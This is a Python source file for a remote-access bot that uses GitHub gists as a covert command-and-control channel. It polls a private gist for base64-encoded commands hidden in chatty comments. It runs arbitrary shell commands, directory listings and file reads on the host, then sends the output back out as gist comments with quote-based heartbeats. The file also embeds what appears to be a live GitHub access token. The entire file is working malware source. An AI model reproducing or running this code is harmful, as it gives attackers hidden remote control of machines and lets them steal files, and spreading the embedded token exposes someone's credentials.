import base64
import os
import uuid
import requests
import time
from datetime import datetime, timezone
from dateutil import parser as dt_parser
import random

controller_gist_id = "5a2a81be0b757f8fd0fef8d987806a08"
token = "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"


def connect_bot(quote, bot_gist_id):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    text = f"{quote} {bot_gist_id}"
    body = {"body": text}
    r = requests.post(f"https://api.github.com/gists/{controller_gist_id}/comments", headers=headers, json=body)

    if r.status_code != 201:
        quit()

    content = r.json()
    comment_id_tmp = content['id']
    created_at = dt_parser.parse(content['created_at']).astimezone(timezone.utc)
    updated_at = dt_parser.parse(content['updated_at']).astimezone(timezone.utc)
    comment_id = comment_id_tmp
    return comment_id, created_at, updated_at, quote


def heartbeat(comment_id, quote, bot_gist_id):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    text = f"{quote} {bot_gist_id}"
    body = {"body": text}
    r = requests.patch(f"https://api.github.com/gists/{controller_gist_id}/comments/{comment_id}", headers=headers,
                       json=body)
    if r.status_code != 200:
        quit()


def create_bot_gist():
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    body = {"public": False, "files": {f"{uuid.uuid4()}": {"content": "Fun, innit?"}}}
    r = requests.post(f"https://api.github.com/gists", headers=headers, json=body)
    res_body = r.json()
    if r.status_code != 201:
        print("Couldn't create gist")
        quit()
    return res_body['id']


def check_for_command(last_check, bot_gist_id):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"https://api.github.com/gists/{bot_gist_id}/comments", headers=headers)
    if r.status_code == 200:
        comments = r.json()
        commands = []
        greatest_datetime = last_check

        if len(comments) > 0:
            for comment in comments:
                req_body = comment['body']
                split = req_body.split(" ")
                if split[0] != "Hey,":
                    continue
                req_created_at = dt_parser.parse(comment['created_at']).astimezone(timezone.utc)
                req_id = comment['id']
                if req_created_at > last_check:
                    commands.append({'id': req_id, 'created_at': req_created_at, 'body': req_body})
                if req_created_at > greatest_datetime:
                    greatest_datetime = req_created_at

            if len(commands) > 0:
                last_check = greatest_datetime
                return True, last_check, commands
            else:
                return False, last_check, commands
        else:
            return False, last_check, "a"


def parse_command(command):
    cmd_body = command['body'].split(" ")
    cmd_base64 = cmd_body[1]
    cmd = base64.b64decode(cmd_base64).decode("utf-8")
    return cmd


def get_file_content(file_path):
    try:
        with open(file_path, "rb") as f:
            return base64.b64encode(f.read())
    except IOError:
        return None


def handle_w():
    stream = os.popen("w")
    output = bytes(stream.read(), encoding="utf-8")
    stream.close()
    return output


def handle_ls(cmd):
    path = cmd[1]
    stream = os.popen(f"ls {path}")
    output = bytes(stream.read(), encoding="utf-8")
    stream.close()
    return output


def handle_id():
    stream = os.popen("id")
    output = bytes(stream.read(), encoding="utf-8")
    stream.close()
    return output


def handle_cp(file_path):
    file_content = get_file_content(file_path)
    if file_content is not None:
        return file_content.decode("utf-8")
    else:
        return None


def handle_ex(cmd):
    stream = os.popen(f"{cmd[1]}")
    output = bytes(stream.read(), encoding="utf-8")
    stream.close()
    return output


def handle_response(body, bot_gist_id):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    r = requests.post(f"https://api.github.com/gists/{bot_gist_id}/comments", headers=headers, json=body)
    res_body = r.json()
    if r.status_code != 201:
        print("Couldn't create comment")
        quit()


def process_commands(commands, bot_gist_id):
    for command in commands:
        cmd = parse_command(command).split(" ")
        body = None
        if cmd[0] == "w":
            output = handle_w()
            if output != b'':
                body = {'body': f'Here you go mate {base64.b64encode(output).decode("utf-8")} {command["id"]}'}
        elif cmd[0] == "ls":
            output = handle_ls(cmd)
            if output != b'':
                body = {'body': f'Here you go mate {base64.b64encode(output).decode("utf-8")} {command["id"]}'}
        elif cmd[0] == "id":
            output = handle_id()
            if output != b'':
                body = {'body': f'Here you go mate {base64.b64encode(output).decode("utf-8")} {command["id"]}'}
        elif cmd[0] == "cp":
            file_content = handle_cp(cmd[1])
            body = {'body': f'That\'s what\'s up dawg! {file_content} {command["id"]}'}
        elif cmd[0] == "ex":
            output = handle_ex(cmd[1])
            if output != b'':
                body = {'body': f'Here you go mate {base64.b64encode(output)} {command["id"]}'}
        if body is not None:
            handle_response(body, bot_gist_id)
        else:
            handle_response({'body': f'Houston we had a problem with {command["id"]}'}, bot_gist_id)


def run():
    with open("quotes.txt", "r", encoding="utf-8") as f:
        quotes = f.read()
    quotes = quotes.split("\n")
    quote = quotes[random.randint(0, len(quotes))]

    last_check_init = datetime.now(timezone.utc)
    last_check = last_check_init
    bot_gist_id = create_bot_gist()

    while True:
        comment_id, comment_created_at, comment_updated_at, comment_quote = connect_bot(quote, bot_gist_id)

        while True:
            quote = quotes[random.randint(0, len(quotes) - 1)]
            heartbeat(comment_id, quote, bot_gist_id)
            has_command, last_check, commands = check_for_command(last_check, bot_gist_id)
            if has_command:
                process_commands(commands, bot_gist_id)
            time.sleep(15)
        time.sleep(15)


if __name__ == "__main__":
    run()


